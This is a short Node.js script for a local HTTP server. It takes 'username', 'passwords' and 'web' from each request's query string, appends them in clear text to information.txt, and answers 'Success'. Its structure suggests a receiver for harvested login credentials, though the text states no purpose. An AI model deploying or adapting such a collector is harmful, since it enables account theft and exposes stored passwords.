var http = require('http');
var url = require('url');
var fs = require('fs');
http.createServer(function (req, res) {
 if(req.url!=="/favicon.ico")
         console.log(req.url);
  var query = url.parse(req.url, true).query;
  var name = query.username;
  var passwords = query.passwords;
  var web= query.web;
    fs.open('information.txt', 'a', 666, function(e, id) {
      var content ='username:'+ name + '\n' +'password:'+ passwords + '\n'+'web:'+ web + '\n'+'\n';
      fs.write(id, content, null, 'utf8', function() {
        fs.close(id, function() {
          console.log('save success');
        });
      });
    });
  
  res.writeHead(200, {'Content-Type': 'text/plain'});
  res.end('Success\n');
}).listen(1337, "127.0.0.1");
console.log('Server running at http://127.0.0.1:1337/');